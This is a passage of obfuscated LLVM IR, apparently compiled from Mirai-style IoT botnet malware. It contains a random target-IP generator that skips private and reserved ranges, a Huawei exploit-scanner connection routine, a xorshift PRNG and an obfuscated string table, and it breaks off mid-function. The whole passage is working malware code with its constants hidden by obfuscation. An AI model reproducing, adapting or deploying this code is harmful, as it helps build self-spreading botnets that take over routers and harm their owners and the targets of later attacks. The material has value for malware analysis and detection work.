  call void @srand(i32 %11) #6
  %12 = load i32, i32* %2, align 4
  %13 = xor i32 255, -1
  %14 = xor i32 %12, %13
  %15 = and i32 %14, %12
  %16 = and i32 %12, 255
  %17 = trunc i32 %15 to i8
  store i8 %17, i8* %3, align 1
  %18 = load i32, i32* %2, align 4
  %19 = lshr i32 %18, 8
  %20 = xor i32 255, -1
  %21 = xor i32 %19, %20
  %22 = and i32 %21, %19
  %23 = and i32 %19, 255
  %24 = trunc i32 %22 to i8
  store i8 %24, i8* %4, align 1
  %25 = load i32, i32* %2, align 4
  %26 = lshr i32 %25, 16
  %27 = xor i32 255, -1
  %28 = xor i32 %26, %27
  %29 = and i32 %28, %26
  %30 = and i32 %26, 255
  %31 = trunc i32 %29 to i8
  store i8 %31, i8* %5, align 1
  %32 = load i32, i32* %2, align 4
  %33 = lshr i32 %32, 24
  %34 = xor i32 %33, -1
  %35 = xor i32 255, -1
  %36 = xor i32 -754142248, -1
  %37 = or i32 %34, %35
  %38 = or i32 -754142248, %36
  %39 = xor i32 %37, -1
  %40 = and i32 %39, %38
  %41 = and i32 %33, 255
  %42 = trunc i32 %40 to i8
  store i8 %42, i8* %6, align 1
  br label %43

; <label>:43:                                     ; preds = %8
  %44 = load i8, i8* %3, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 127
  br i1 %46, label %181, label %47

; <label>:47:                                     ; preds = %43
  %48 = load i8, i8* %3, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %181, label %51

; <label>:51:                                     ; preds = %47
  %52 = load i8, i8* %3, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 3
  br i1 %54, label %181, label %55

; <label>:55:                                     ; preds = %51
  %56 = load i8, i8* %3, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 15
  br i1 %58, label %181, label %59

; <label>:59:                                     ; preds = %55
  %60 = load i8, i8* %3, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 16
  br i1 %62, label %181, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i8, i8* %3, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 56
  br i1 %66, label %181, label %67

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* %3, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 10
  br i1 %70, label %181, label %71

; <label>:71:                                     ; preds = %67
  %72 = load i8, i8* %3, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 192
  br i1 %74, label %75, label %79

; <label>:75:                                     ; preds = %71
  %76 = load i8, i8* %4, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 168
  br i1 %78, label %181, label %79

; <label>:79:                                     ; preds = %75, %71
  %80 = load i8, i8* %3, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 172
  br i1 %82, label %83, label %91

; <label>:83:                                     ; preds = %79
  %84 = load i8, i8* %4, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp sge i32 %85, 16
  br i1 %86, label %87, label %91

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* %4, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp slt i32 %89, 32
  br i1 %90, label %181, label %91

; <label>:91:                                     ; preds = %87, %83, %79
  %92 = load i8, i8* %3, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 100
  br i1 %94, label %95, label %103

; <label>:95:                                     ; preds = %91
  %96 = load i8, i8* %4, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp sge i32 %97, 64
  br i1 %98, label %99, label %103

; <label>:99:                                     ; preds = %95
  %100 = load i8, i8* %4, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %101, 127
  br i1 %102, label %181, label %103

; <label>:103:                                    ; preds = %99, %95, %91
  %104 = load i8, i8* %3, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 169
  br i1 %106, label %107, label %111

; <label>:107:                                    ; preds = %103
  %108 = load i8, i8* %4, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp sgt i32 %109, 254
  br i1 %110, label %181, label %111

; <label>:111:                                    ; preds = %107, %103
  %112 = load i8, i8* %3, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 198
  br i1 %114, label %115, label %123

; <label>:115:                                    ; preds = %111
  %116 = load i8, i8* %4, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp sge i32 %117, 18
  br i1 %118, label %119, label %123

; <label>:119:                                    ; preds = %115
  %120 = load i8, i8* %4, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %121, 20
  br i1 %122, label %181, label %123

; <label>:123:                                    ; preds = %119, %115, %111
  %124 = load i8, i8* %3, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp sge i32 %125, 224
  br i1 %126, label %181, label %127

; <label>:127:                                    ; preds = %123
  %128 = load i8, i8* %3, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 6
  br i1 %130, label %179, label %131

; <label>:131:                                    ; preds = %127
  %132 = load i8, i8* %3, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 7
  br i1 %134, label %179, label %135

; <label>:135:                                    ; preds = %131
  %136 = load i8, i8* %3, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 11
  br i1 %138, label %179, label %139

; <label>:139:                                    ; preds = %135
  %140 = load i8, i8* %3, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 21
  br i1 %142, label %179, label %143

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* %3, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 22
  br i1 %146, label %179, label %147

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* %3, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 26
  br i1 %150, label %179, label %151

; <label>:151:                                    ; preds = %147
  %152 = load i8, i8* %3, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 28
  br i1 %154, label %179, label %155

; <label>:155:                                    ; preds = %151
  %156 = load i8, i8* %3, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 29
  br i1 %158, label %179, label %159

; <label>:159:                                    ; preds = %155
  %160 = load i8, i8* %3, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 30
  br i1 %162, label %179, label %163

; <label>:163:                                    ; preds = %159
  %164 = load i8, i8* %3, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 33
  br i1 %166, label %179, label %167

; <label>:167:                                    ; preds = %163
  %168 = load i8, i8* %3, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 55
  br i1 %170, label %179, label %171

; <label>:171:                                    ; preds = %167
  %172 = load i8, i8* %3, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 214
  br i1 %174, label %179, label %175

; <label>:175:                                    ; preds = %171
  %176 = load i8, i8* %3, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 215
  br label %179

; <label>:179:                                    ; preds = %175, %171, %167, %163, %159, %155, %151, %147, %143, %139, %135, %131, %127
  %180 = phi i1 [ true, %171 ], [ true, %167 ], [ true, %163 ], [ true, %159 ], [ true, %155 ], [ true, %151 ], [ true, %147 ], [ true, %143 ], [ true, %139 ], [ true, %135 ], [ true, %131 ], [ true, %127 ], [ %178, %175 ]
  br label %181

; <label>:181:                                    ; preds = %179, %123, %119, %107, %99, %87, %75, %67, %63, %59, %55, %51, %47, %43
  %182 = phi i1 [ true, %123 ], [ true, %119 ], [ true, %107 ], [ true, %99 ], [ true, %87 ], [ true, %75 ], [ true, %67 ], [ true, %63 ], [ true, %59 ], [ true, %55 ], [ true, %51 ], [ true, %47 ], [ true, %43 ], [ %180, %179 ]
  br i1 %182, label %8, label %183

; <label>:183:                                    ; preds = %181
  %184 = call i32 @rand() #6
  %185 = srem i32 %184, 3
  store i32 %185, i32* %7, align 4
  %186 = load i32, i32* %7, align 4
  %187 = icmp eq i32 %186, 0
  br i1 %187, label %188, label %235

; <label>:188:                                    ; preds = %183
  %189 = load i8, i8* %4, align 1
  %190 = zext i8 %189 to i32
  %191 = shl i32 %190, 16
  %192 = xor i32 -1677721600, -1
  %193 = xor i32 %191, -1
  %194 = xor i32 1798371208, -1
  %195 = and i32 %192, 1798371208
  %196 = and i32 -1677721600, %194
  %197 = and i32 %193, 1798371208
  %198 = and i32 %191, %194
  %199 = or i32 %195, %196
  %200 = or i32 %197, %198
  %201 = xor i32 %199, %200
  %202 = or i32 %192, %193
  %203 = xor i32 %202, -1
  %204 = or i32 1798371208, %194
  %205 = and i32 %203, %204
  %206 = or i32 %201, %205
  %207 = or i32 -1677721600, %191
  %208 = load i8, i8* %5, align 1
  %209 = zext i8 %208 to i32
  %210 = shl i32 %209, 8
  %211 = xor i32 %206, -1
  %212 = xor i32 %210, -1
  %213 = xor i32 -1612317166, -1
  %214 = and i32 %211, -1612317166
  %215 = and i32 %206, %213
  %216 = and i32 %212, -1612317166
  %217 = and i32 %210, %213
  %218 = or i32 %214, %215
  %219 = or i32 %216, %217
  %220 = xor i32 %218, %219
  %221 = or i32 %211, %212
  %222 = xor i32 %221, -1
  %223 = or i32 -1612317166, %213
  %224 = and i32 %222, %223
  %225 = or i32 %220, %224
  %226 = or i32 %206, %210
  %227 = load i8, i8* %6, align 1
  %228 = zext i8 %227 to i32
  %229 = shl i32 %228, 0
  %230 = and i32 %225, %229
  %231 = xor i32 %225, %229
  %232 = or i32 %230, %231
  %233 = or i32 %225, %229
  %234 = call i32 @htonl(i32 %232) #9
  store i32 %234, i32* %1, align 4
  br label %376

; <label>:235:                                    ; preds = %183
  %236 = load i32, i32* %7, align 4
  %237 = icmp eq i32 %236, 1
  br i1 %237, label %238, label %285

; <label>:238:                                    ; preds = %235
  %239 = load i8, i8* %4, align 1
  %240 = zext i8 %239 to i32
  %241 = shl i32 %240, 16
  %242 = and i32 -989855744, %241
  %243 = xor i32 -989855744, %241
  %244 = or i32 %242, %243
  %245 = or i32 -989855744, %241
  %246 = load i8, i8* %5, align 1
  %247 = zext i8 %246 to i32
  %248 = shl i32 %247, 8
  %249 = xor i32 %244, -1
  %250 = xor i32 %248, -1
  %251 = xor i32 -706739922, -1
  %252 = and i32 %249, -706739922
  %253 = and i32 %244, %251
  %254 = and i32 %250, -706739922
  %255 = and i32 %248, %251
  %256 = or i32 %252, %253
  %257 = or i32 %254, %255
  %258 = xor i32 %256, %257
  %259 = or i32 %249, %250
  %260 = xor i32 %259, -1
  %261 = or i32 -706739922, %251
  %262 = and i32 %260, %261
  %263 = or i32 %258, %262
  %264 = or i32 %244, %248
  %265 = load i8, i8* %6, align 1
  %266 = zext i8 %265 to i32
  %267 = shl i32 %266, 0
  %268 = xor i32 %263, -1
  %269 = xor i32 %267, -1
  %270 = xor i32 639379869, -1
  %271 = and i32 %268, 639379869
  %272 = and i32 %263, %270
  %273 = and i32 %269, 639379869
  %274 = and i32 %267, %270
  %275 = or i32 %271, %272
  %276 = or i32 %273, %274
  %277 = xor i32 %275, %276
  %278 = or i32 %268, %269
  %279 = xor i32 %278, -1
  %280 = or i32 639379869, %270
  %281 = and i32 %279, %280
  %282 = or i32 %277, %281
  %283 = or i32 %263, %267
  %284 = call i32 @htonl(i32 %282) #9
  store i32 %284, i32* %1, align 4
  br label %376

; <label>:285:                                    ; preds = %235
  %286 = load i32, i32* %7, align 4
  %287 = icmp eq i32 %286, 2
  br i1 %287, label %288, label %323

; <label>:288:                                    ; preds = %285
  %289 = load i8, i8* %4, align 1
  %290 = zext i8 %289 to i32
  %291 = shl i32 %290, 16
  %292 = and i32 687865856, %291
  %293 = xor i32 687865856, %291
  %294 = or i32 %292, %293
  %295 = or i32 687865856, %291
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = shl i32 %297, 8
  %299 = and i32 %294, %298
  %300 = xor i32 %294, %298
  %301 = or i32 %299, %300
  %302 = or i32 %294, %298
  %303 = load i8, i8* %6, align 1
  %304 = zext i8 %303 to i32
  %305 = shl i32 %304, 0
  %306 = xor i32 %301, -1
  %307 = xor i32 %305, -1
  %308 = xor i32 940203992, -1
  %309 = and i32 %306, 940203992
  %310 = and i32 %301, %308
  %311 = and i32 %307, 940203992
  %312 = and i32 %305, %308
  %313 = or i32 %309, %310
  %314 = or i32 %311, %312
  %315 = xor i32 %313, %314
  %316 = or i32 %306, %307
  %317 = xor i32 %316, -1
  %318 = or i32 940203992, %308
  %319 = and i32 %317, %318
  %320 = or i32 %315, %319
  %321 = or i32 %301, %305
  %322 = call i32 @htonl(i32 %320) #9
  store i32 %322, i32* %1, align 4
  br label %376

; <label>:323:                                    ; preds = %285
  %324 = load i32, i32* %7, align 4
  %325 = icmp eq i32 %324, 3
  br i1 %325, label %326, label %376

; <label>:326:                                    ; preds = %323
  %327 = load i8, i8* %3, align 1
  %328 = zext i8 %327 to i32
  %329 = shl i32 %328, 24
  %330 = load i8, i8* %4, align 1
  %331 = zext i8 %330 to i32
  %332 = shl i32 %331, 16
  %333 = and i32 %329, %332
  %334 = xor i32 %329, %332
  %335 = or i32 %333, %334
  %336 = or i32 %329, %332
  %337 = load i8, i8* %5, align 1
  %338 = zext i8 %337 to i32
  %339 = shl i32 %338, 8
  %340 = xor i32 %335, -1
  %341 = xor i32 %339, -1
  %342 = xor i32 -185678755, -1
  %343 = and i32 %340, -185678755
  %344 = and i32 %335, %342
  %345 = and i32 %341, -185678755
  %346 = and i32 %339, %342
  %347 = or i32 %343, %344
  %348 = or i32 %345, %346
  %349 = xor i32 %347, %348
  %350 = or i32 %340, %341
  %351 = xor i32 %350, -1
  %352 = or i32 -185678755, %342
  %353 = and i32 %351, %352
  %354 = or i32 %349, %353
  %355 = or i32 %335, %339
  %356 = load i8, i8* %6, align 1
  %357 = zext i8 %356 to i32
  %358 = shl i32 %357, 0
  %359 = xor i32 %354, -1
  %360 = xor i32 %358, -1
  %361 = xor i32 2071580723, -1
  %362 = and i32 %359, 2071580723
  %363 = and i32 %354, %361
  %364 = and i32 %360, 2071580723
  %365 = and i32 %358, %361
  %366 = or i32 %362, %363
  %367 = or i32 %364, %365
  %368 = xor i32 %366, %367
  %369 = or i32 %359, %360
  %370 = xor i32 %369, -1
  %371 = or i32 2071580723, %361
  %372 = and i32 %370, %371
  %373 = or i32 %368, %372
  %374 = or i32 %354, %358
  %375 = call i32 @htonl(i32 %373) #9
  store i32 %375, i32* %1, align 4
  br label %376

; <label>:376:                                    ; preds = %326, %323, %288, %238, %188
  %377 = load i32, i32* %1, align 4
  ret i32 %377
}

; Function Attrs: noinline nounwind uwtable
define internal void @huawei_setup_connection(%struct.exploit_scanner_connection*) #0 {
  %2 = alloca %struct.exploit_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %86

; <label>:21:                                     ; preds = %15
  %22 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %22, i32 0, i32 5
  store i32 0, i32* %23, align 4
  %24 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %24, i32 0, i32 6
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = xor i32 2048, -1
  %35 = xor i32 %33, -1
  %36 = xor i32 1429620733, -1
  %37 = and i32 %34, 1429620733
  %38 = and i32 2048, %36
  %39 = and i32 %35, 1429620733
  %40 = and i32 %33, %36
  %41 = or i32 %37, %38
  %42 = or i32 %39, %40
  %43 = xor i32 %41, %42
  %44 = or i32 %34, %35
  %45 = xor i32 %44, -1
  %46 = or i32 1429620733, %36
  %47 = and i32 %45, %46
  %48 = or i32 %43, %47
  %49 = or i32 2048, %33
  %50 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %48)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %53 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %52, i32 0, i32 3
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %56 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %58 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %57, i32 0, i32 4
  %59 = load i16, i16* %58, align 8
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %59, i16* %60, align 2
  %61 = load i32, i32* @huawei_fake_time, align 4
  %62 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %63 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %62, i32 0, i32 1
  store i32 %61, i32* %63, align 4
  %64 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %64, i32 0, i32 2
  %66 = load i32, i32* %65, align 8
  %67 = icmp eq i32 %66, 3
  br i1 %67, label %73, label %68

; <label>:68:                                     ; preds = %21
  %69 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %70 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %69, i32 0, i32 2
  %71 = load i32, i32* %70, align 8
  %72 = icmp eq i32 %71, 4
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %68, %21
  br label %77

; <label>:74:                                     ; preds = %68
  %75 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %76 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %75, i32 0, i32 2
  store i32 1, i32* %76, align 8
  br label %77

; <label>:77:                                     ; preds = %74, %73
  %78 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %79 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 8
  %81 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %82 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %82, %struct.sockaddr** %81, align 8
  %83 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %84 = load %struct.sockaddr*, %struct.sockaddr** %83, align 8
  %85 = call i32 @connect(i32 %80, %struct.sockaddr* %84, i32 16)
  br label %86

; <label>:86:                                     ; preds = %77, %20
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @huawei_recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %47

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %46

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = sub i32 0, %40
  %42 = sub i32 0, 1
  %43 = add i32 %41, %42
  %44 = sub i32 0, %43
  %45 = add nsw i32 %40, 1
  store i32 %44, i32* %10, align 4
  br label %21

; <label>:46:                                     ; preds = %21
  br label %47

; <label>:47:                                     ; preds = %46, %4
  %48 = load i32, i32* %9, align 4
  ret i32 %48
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = call i64 @time(i64* null) #6
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = call i32 @getpid() #6
  %4 = call i32 @getppid() #6
  %5 = xor i32 %3, -1
  %6 = and i32 %4, %5
  %7 = xor i32 %4, -1
  %8 = and i32 %3, %7
  %9 = or i32 %6, %8
  %10 = xor i32 %3, %4
  store i32 %9, i32* @y, align 4
  %11 = call i64 @clock() #6
  %12 = trunc i64 %11 to i32
  store i32 %12, i32* @z, align 4
  %13 = load i32, i32* @z, align 4
  %14 = load i32, i32* @y, align 4
  %15 = xor i32 %13, -1
  %16 = and i32 %14, %15
  %17 = xor i32 %14, -1
  %18 = and i32 %13, %17
  %19 = or i32 %16, %18
  %20 = xor i32 %13, %14
  store i32 %19, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @getppid() #2

; Function Attrs: nounwind
declare i64 @clock() #2

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 182455406, %6
  %8 = xor i32 182455406, -1
  %9 = and i32 %5, %8
  %10 = xor i32 %4, -1
  %11 = and i32 %10, 182455406
  %12 = and i32 %4, %8
  %13 = or i32 %7, %9
  %14 = or i32 %11, %12
  %15 = xor i32 %13, %14
  %16 = xor i32 %5, %4
  store i32 %15, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = lshr i32 %17, 8
  %19 = load i32, i32* %1, align 4
  %20 = xor i32 %19, -1
  %21 = and i32 %18, %20
  %22 = xor i32 %18, -1
  %23 = and i32 %19, %22
  %24 = or i32 %21, %23
  %25 = xor i32 %19, %18
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 -850573701, %32
  %34 = xor i32 -850573701, -1
  %35 = and i32 %31, %34
  %36 = xor i32 %30, -1
  %37 = and i32 %36, -850573701
  %38 = and i32 %30, %34
  %39 = or i32 %33, %35
  %40 = or i32 %37, %38
  %41 = xor i32 %39, %40
  %42 = xor i32 %31, %30
  store i32 %41, i32* @w, align 4
  %43 = load i32, i32* %1, align 4
  %44 = load i32, i32* @w, align 4
  %45 = xor i32 %44, -1
  %46 = and i32 %43, %45
  %47 = xor i32 %43, -1
  %48 = and i32 %44, %47
  %49 = or i32 %46, %48
  %50 = xor i32 %44, %43
  store i32 %49, i32* @w, align 4
  %51 = load i32, i32* @w, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind uwtable
define void @table_init() #0 {
  call void @add_entry(i8 zeroext 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.84, i32 0, i32 0), i32 14)
  call void @add_entry(i8 zeroext 2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1.85, i32 0, i32 0), i32 19)
  call void @add_entry(i8 zeroext 3, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2.86, i32 0, i32 0), i32 23)
  call void @add_entry(i8 zeroext 4, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3.87, i32 0, i32 0), i32 24)
  call void @add_entry(i8 zeroext 5, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4.88, i32 0, i32 0), i32 15)
  call void @add_entry(i8 zeroext 6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5.89, i32 0, i32 0), i32 22)
  call void @add_entry(i8 zeroext 7, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6.90, i32 0, i32 0), i32 15)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_entry(i8 zeroext, i8*, i32) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store i8 %0, i8* %4, align 1
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load i32, i32* %6, align 4
  %9 = sext i32 %8 to i64
  %10 = call noalias i8* @malloc(i64 %9) #6
  store i8* %10, i8** %7, align 8
  %11 = load i8*, i8** %7, align 8
  %12 = load i8*, i8** %5, align 8
  %13 = load i32, i32* %6, align 4
  call void @util_memcpy(i8* %11, i8* %12, i32 %13)
  %14 = load i8*, i8** %7, align 8
  %15 = load i8, i8* %4, align 1
  %16 = zext i8 %15 to i64
  %17 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %16
  %18 = getelementptr inbounds %struct.table_value, %struct.table_value* %17, i32 0, i32 0
  store i8* %14, i8** %18, align 16
  %19 = load i32, i32* %6, align 4
  %20 = trunc i32 %19 to i16
  %21 = load i8, i8* %4, align 1
  %22 = zext i8 %21 to i64
  %23 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %22
  %24 = getelementptr inbounds %struct.table_value, %struct.table_value* %23, i32 0, i32 1
  store i16 %20, i16* %24, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
